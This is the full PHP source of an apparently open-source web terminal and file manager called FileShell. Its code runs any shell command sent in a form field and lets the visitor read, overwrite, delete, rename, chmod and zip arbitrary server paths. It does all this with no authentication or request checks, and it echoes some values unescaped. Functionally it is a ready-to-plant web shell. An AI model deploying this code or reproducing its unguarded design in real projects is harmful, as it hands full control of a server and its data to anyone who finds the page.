<?php
/**
 * FileShell - PHP Terminal and File Manager
 * ------------------------------------------
 * Author: Tauseed Zaman
 * GitHub: https://github.com/tauseedzaman
 * Project: https://github.com/tauseedzaman/php-terminal-and-file-manager
 *
 * Description:
 * A lightweight web-based terminal and file manager written in PHP.
 * Use with caution — powerful tool with direct access to your server.
 *
 * Created with 💻 by Tauseed Zaman
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

function executeCommand($cmd)
{
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return shell_exec("cmd /c " . escapeshellarg($cmd));
    } else {
        return shell_exec($cmd);
    }
}

function formatSize($size)
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $unitIndex = 0;
    while ($size >= 1024 && $unitIndex < count($units) - 1) {
        $size /= 1024;
        $unitIndex++;
    }
    return round($size, 2) . " " . $units[$unitIndex];
}

$directory = isset($_POST['directory']) ? $_POST['directory'] : getcwd();
$output = '';
$fileContent = '';
$selectedFilePath = '';

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (strpos($cmd, 'cd ') === 0) {
        $newDir = trim(substr($cmd, 3));
        if (is_dir($newDir)) {
            $directory = realpath($newDir);
        } else {
            $output = "Directory not found.";
        }
    } else {
        $output = executeCommand($cmd);
    }
}

if (isset($_POST['file'])) {
    $selectedFilePath = $_POST['file'];
    if (is_file($selectedFilePath) && is_readable($selectedFilePath)) {
        $fileContent = file_get_contents($selectedFilePath);
    } else {
        $fileContent = "You do not have permissions to open this file.";
    }
}

if (isset($_POST['edit'])) {
    file_put_contents($_POST['selectedFilePath'], $_POST['fileContent']);
    $output = "File saved successfully.";
}

if (isset($_POST['deleteFile'])) {
    unlink($_POST['deleteFile']);
    $output = "File deleted.";
}

if (isset($_POST['deleteDir'])) {
    rmdir($_POST['deleteDir']);
    $output = "Directory deleted.";
}

if (isset($_POST['renameFrom']) && isset($_POST['renameTo'])) {
    rename($_POST['renameFrom'], $_POST['renameTo']);
    $output = "Renamed successfully.";
}

if (isset($_POST['newFile'])) {
    $newPath = $directory . '/' . basename($_POST['newFile']);
    file_put_contents($newPath, '');
    $output = "File created.";
}

if (isset($_POST['newDir'])) {
    $newPath = $directory . '/' . basename($_POST['newDir']);
    mkdir($newPath);
    $output = "Directory created.";
}

if (isset($_POST['chmodPath']) && isset($_POST['chmodValue'])) {
    chmod($_POST['chmodPath'], octdec($_POST['chmodValue']));
    $output = "Permissions changed.";
}

if (isset($_POST['zipPath'])) {
    $zipFile = $directory . '/' . basename($_POST['zipPath']) . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
        $file = $_POST['zipPath'];
        $zip->addFile($file, basename($file));
        $zip->close();
        $output = "ZIP file created: " . htmlspecialchars(basename($zipFile));
    } else {
        $output = "Failed to create ZIP.";
    }
}

if (isset($_POST['back'])) {
    $directory = dirname($directory);
}

$files = scandir($directory);

$fileDetails = [];
foreach ($files as $file) {
    if ($file != '.' && $file != '..') {
        $filePath = $directory . '/' . $file;
        $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
        $owner = fileowner($filePath);
        $group = filegroup($filePath);
        $lastModified = date("Y-m-d H:i:s", filemtime($filePath));
        $creationTime = date("Y-m-d H:i:s", filectime($filePath));
        $size = is_file($filePath) ? formatSize(filesize($filePath)) : '-';

        $fileDetails[] = [
            'name' => $file,
            'permissions' => $permissions,
            'owner' => $owner,
            'group' => $group,
            'last_modified' => $lastModified,
            'creation_time' => $creationTime,
            'path' => $filePath,
            'size' => $size
        ];
    }
}

$diskTotalSpace = disk_total_space("/");
$diskFreeSpace = disk_free_space("/");
$diskUsedSpace = $diskTotalSpace - $diskFreeSpace;
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>FileShell -- PHP Terminal & File Manager</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            line-height: 1.6;
        }

        h1,
        h2,
        h3 {
            color: #39ff14;
            border-bottom: 1px solid #222;
            padding-bottom: 5px;
        }

        form {
            margin-bottom: 15px;
        }

        input[type="text"],
        input[type="submit"],
        textarea {
            background-color: #1a1a1a;
            color: #00ff00;
            border: 1px solid #333;
            padding: 8px;
            font-size: 14px;
            border-radius: 4px;
        }

        input[type="submit"] {
            background-color: #111;
            border: 1px solid #39ff14;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            margin-left: 5px;
        }

        input[type="submit"]:hover {
            background-color: #39ff14;
            color: #000;
        }

        textarea {
            width: 100%;
            max-width: 100%;
            min-height: 300px;
            resize: vertical;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 14px;
        }

        th,
        td {
            padding: 10px;
            text-align: left;
            border: 1px solid #333;
        }

        thead {
            background-color: #1f1f1f;
        }

        tbody tr:hover {
            background-color: #262626;
        }

        pre {
            background-color: #1a1a1a;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 4px;
            overflow-x: auto;
        }

        table form {
            display: inline-block;
            margin-right: 5px;
        }

        ul {
            list-style: none;
            padding-left: 0;
        }

        ul li {
            padding: 4px 0;
        }

        @media (max-width: 768px) {

            table,
            thead,
            tbody,
            th,
            td,
            tr {
                display: block;
            }

            th,
            td {
                text-align: right;
                padding-left: 50%;
                position: relative;
            }

            th::before,
            td::before {
                position: absolute;
                top: 50%;
                left: 10px;
                transform: translateY(-50%);
                font-weight: bold;
                white-space: nowrap;
            }

            th:nth-child(1)::before {
                content: "Name";
            }

            th:nth-child(2)::before {
                content: "Size";
            }

            th:nth-child(3)::before {
                content: "Permissions";
            }

            th:nth-child(4)::before {
                content: "Owner";
            }

            th:nth-child(5)::before {
                content: "Group";
            }

            th:nth-child(6)::before {
                content: "Modified";
            }

            th:nth-child(7)::before {
                content: "Created";
            }

            th:nth-child(8)::before {
                content: "Actions";
            }
        }
    </style>
</head>

<body>
    <h1>FileShell -- PHP Terminal & File Manager by <a
            href="https://github.com/tauseedzaman/php-terminal-and-file-manager">tauseedzaman</a> </h1>

    <form method="post">
        <input type="text" name="cmd" placeholder="Shell command" required>
        <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
        <input type="submit" value="Run">
    </form>

    <form method="post">
        <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
        <input type="submit" name="back" value="Go Back">
    </form>

    <h3>System Info</h3>
    <ul>
        <li>OS: <?= php_uname() ?></li>
        <li>PHP: <?= phpversion() ?></li>
        <li>Dir: <?= $directory ?></li>
        <li>Disk: <?= formatSize($diskUsedSpace) ?> used / <?= formatSize($diskTotalSpace) ?></li>
    </ul>

    <pre><?= htmlspecialchars($output) ?></pre>

    <?php if ($selectedFilePath): ?>
        <h3>Editing: <?= htmlspecialchars($selectedFilePath) ?></h3>
        <form method="post">
            <textarea name="fileContent" rows="20" cols="100"><?= htmlspecialchars($fileContent) ?></textarea>
            <input type="hidden" name="selectedFilePath" value="<?= htmlspecialchars($selectedFilePath) ?>">
            <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
            <input type="submit" name="edit" value="Save">
        </form>
    <?php endif; ?>

    <h3>Create New</h3>
    <form method="post">
        <input type="text" name="newFile" placeholder="Filename">
        <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
        <input type="submit" value="Create File">
    </form>
    <form method="post">
        <input type="text" name="newDir" placeholder="Directory name">
        <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
        <input type="submit" value="Create Directory">
    </form>

    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Permissions</th>
                <th>Owner</th>
                <th>Group</th>
                <th>Modified</th>
                <th>Created</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($fileDetails as $f): ?>
                <tr>
                    <td><?= htmlspecialchars($f['name']) ?></td>
                    <td><?= $f['size'] ?></td>
                    <td><?= $f['permissions'] ?></td>
                    <td><?= $f['owner'] ?></td>
                    <td><?= $f['group'] ?></td>
                    <td><?= $f['last_modified'] ?></td>
                    <td><?= $f['creation_time'] ?></td>
                    <td>
                        <?php if (is_dir($f['path'])): ?>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="directory" value="<?= htmlspecialchars($f['path']) ?>">
                                <input type="submit" value="Open">
                            </form>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="deleteDir" value="<?= htmlspecialchars($f['path']) ?>">
                                <input type="submit" value="Delete">
                            </form>
                        <?php else: ?>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="file" value="<?= htmlspecialchars($f['path']) ?>">
                                <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
                                <input type="submit" value="Edit">
                            </form>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="deleteFile" value="<?= htmlspecialchars($f['path']) ?>">
                                <input type="submit" value="Delete">
                            </form>
                            <form method="post" style="display:inline">
                                <input type="hidden" name="zipPath" value="<?= htmlspecialchars($f['path']) ?>">
                                <input type="hidden" name="directory" value="<?= htmlspecialchars($directory) ?>">
                                <input type="submit" value="ZIP">
                            </form>
                        <?php endif; ?>
                        <form method="post" style="display:inline">
                            <input type="text" name="renameTo" placeholder="New name" required>
                            <input type="hidden" name="renameFrom" value="<?= htmlspecialchars($f['path']) ?>">
                            <input type="submit" value="Rename">
                        </form>
                        <form method="post" style="display:inline">
                            <input type="text" name="chmodValue" placeholder="e.g. 0755" required>
                            <input type="hidden" name="chmodPath" value="<?= htmlspecialchars($f['path']) ?>">
                            <input type="submit" value="CHMOD">
                        </form>
                        <a href="<?= htmlspecialchars($f['path']) ?>" download>⬇</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>

</html>